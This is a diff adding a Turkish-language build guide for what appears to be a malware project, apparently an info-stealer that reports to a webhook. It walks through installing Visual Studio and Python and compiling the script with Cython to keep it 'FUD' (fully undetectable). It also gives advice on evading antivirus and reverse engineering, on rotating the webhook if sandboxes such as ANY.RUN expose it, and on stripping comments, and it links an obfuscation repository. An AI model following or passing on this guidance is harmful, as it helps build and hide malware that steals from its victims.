@@ -1,0 +1,13 @@
+Öncellikle Visual Studio 2022 C/C++ Masaüsütünü indirmeniz lazım
+Sonrasında python.org sitesinden python 3.13 indirmeniz lazım
+Sonrasında bu klasöre gelip "pip install -r requirements.txt" yazmanız lazım
+shitting.py sakın pyinstaller veya nuitka ile derlemeyin yoksa antivirüsler kesin bulur veya bir insan rahatlıkla tersine mühendis eder
+cythonthing.txt açın ve oradaki kodları aramaya x64 yazınca çıkan Visual Studio 2022 aracılıyla açıp bu klasöre gelip sonrasında bu komutları girin
+Fakat bunları yapmadan önce shitting.py 18 satırda olan webhook = kısmına webhookunuzu yazın
+Bu kadardı. Bu FUD ileride patlayacağı için farklı bir yöntemle FUD geliştirmeyi öğrenmeniz gerek.
+UYARI: Bunu ANY.RUN gibi ortamda başarı ile açarsa webhook adresini ele geçirebilir bu yüzden sürekli webhook adresinizi güncelleyin
+UYARI 2: Visual Studio projemi de kullanabilirsiniz cl komutu yerine, daha kolay yönetilir proje ve bu projeye bakabilirsiniz python kodunu karıştırmak için https://github.com/HydraDragonAntivirus/AntivirusDefender7.0-UEFIRansomware/tree/main
+UYARI 3: Her aşamada yorum satırları  ve boş satırları silmeyi unutma
+UYARI 4: En son ki aşamaya gelince bütün kütüphaneleri kopyalayı yapıştırmayı unutma
+UYARI 5: python gerekliimportlar.py yaparak gerekli kütüphaneler inmiş mi diye bakabilirsiniz
+NOT: CTRL+SHIFT+B kısayolu ile derleyebilirsiniz böylece .exe oluşacaktır
